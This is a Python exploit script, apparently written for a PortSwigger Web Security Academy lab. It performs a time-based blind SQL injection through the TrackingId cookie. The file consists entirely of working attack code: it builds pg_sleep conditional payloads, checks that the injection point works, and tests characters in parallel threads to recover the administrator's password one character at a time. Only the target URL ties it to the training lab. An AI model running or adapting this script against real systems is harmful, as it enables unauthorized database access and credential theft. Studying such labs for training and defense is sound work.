import requests
import string
import urllib3
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "https://0a7b00c8039bc0208094ad8d00510095.web-security-academy.net/"
SLEEP_SECS = 5                         # Lab default is 10; 5 is faster and reliable
TIME_THRESHOLD = SLEEP_SECS * 0.6      # Treat >60% of sleep time as a match
REQUEST_TIMEOUT = SLEEP_SECS + 10
PARALLEL_WORKERS = 10
MAX_PASSWORD_LEN = 30

# Frequency-ordered (slight win on average, doesn't matter much with parallel)
CHARSET = "etaoinshrdlucmfwypvbgkjqxz0123456789"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_payload(index, char, sleep_secs):
    return (
        f"x';SELECT CASE WHEN (username='administrator' "
        f"AND SUBSTRING(password,{index},1)='{char}') "
        f"THEN pg_sleep({sleep_secs}) ELSE pg_sleep(0) END FROM users--"
    )


class TimeBasedSQLi:
    def __init__(self, set_proxy=False):
        self.set_proxy = set_proxy

    def _new_session(self):
        s = requests.Session()
        if self.set_proxy:
            s.proxies.update({
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080",
            })
        return s

    def _send(self, session, payload):
        # Encode ONLY characters that would break the Cookie header
        # (cookie separator ';', plus whitespace/control chars).
        # PortSwigger's lab does not fully URL-decode the cookie value,
        # so leave 'normal' SQL characters (', (, ), =, spaces inside
        # %20 are decoded but literal spaces are also fine here) literal.
        encoded = payload.replace(";", "%3b")
        headers = {"Cookie": f"TrackingId={encoded}"}
        start = time.perf_counter()
        try:
            session.get(TARGET, headers=headers, verify=False,
                        timeout=REQUEST_TIMEOUT)
        except requests.exceptions.ReadTimeout:
            return REQUEST_TIMEOUT
        return time.perf_counter() - start

    def _test_char(self, index, char):
        session = self._new_session()
        elapsed = self._send(session, build_payload(index, char, SLEEP_SECS))
        return char, elapsed

    def sanity_check(self):
        s = self._new_session()
        baseline = self._send(s, "x")
        print(f"[*] Baseline response time: {baseline:.2f}s")
        if baseline > TIME_THRESHOLD:
            print("[!] Baseline already over threshold — server too slow / threshold too low.")
            return False

        forced = f"x';SELECT pg_sleep({SLEEP_SECS})--"
        forced_time = self._send(s, forced)
        print(f"[*] Forced-sleep response time: {forced_time:.2f}s")
        if forced_time < TIME_THRESHOLD:
            print("[!] Forced sleep didn't trigger — payload structure or injection point is wrong.")
            return False

        print("[*] Sanity checks passed.\n")
        return True

    def find_char_at(self, index):
        slow_chars = []
        with ThreadPoolExecutor(max_workers=PARALLEL_WORKERS) as ex:
            futures = [ex.submit(self._test_char, index, c) for c in CHARSET]
            for fut in as_completed(futures):
                char, elapsed = fut.result()
                if elapsed >= TIME_THRESHOLD:
                    slow_chars.append((char, elapsed))

        if not slow_chars:
            return None
        if len(slow_chars) == 1:
            return slow_chars[0][0]

        # Multiple matches → likely network jitter. Re-verify serially.
        print(f"    [!] Ambiguous result at index {index}: {slow_chars}. Re-verifying...")
        confirmed = []
        for char, _ in slow_chars:
            _, elapsed = self._test_char(index, char)
            if elapsed >= TIME_THRESHOLD:
                confirmed.append(char)
        if len(confirmed) == 1:
            return confirmed[0]
        print(f"    [!] Still ambiguous after re-verify: {confirmed}. Bailing.")
        return None

    def start(self):
        print(f"[*] Time-based blind SQLi against {TARGET}")
        print(f"[*] Sleep: {SLEEP_SECS}s | Threshold: {TIME_THRESHOLD}s | Workers: {PARALLEL_WORKERS}\n")
        if not self.sanity_check():
            return

        password = ""
        for i in range(1, MAX_PASSWORD_LEN + 1):
            t0 = time.perf_counter()
            char = self.find_char_at(i)
            dt = time.perf_counter() - t0
            if char is None:
                print(f"[*] No char found at index {i} (took {dt:.1f}s) — stopping.")
                break
            password += char
            print(f"[+] Index {i:2d}: {char}  ({dt:.1f}s)  Current: {password}")

        print(f"\n[!] Final password: {password}")


if __name__ == "__main__":
    TimeBasedSQLi(set_proxy=False).start()
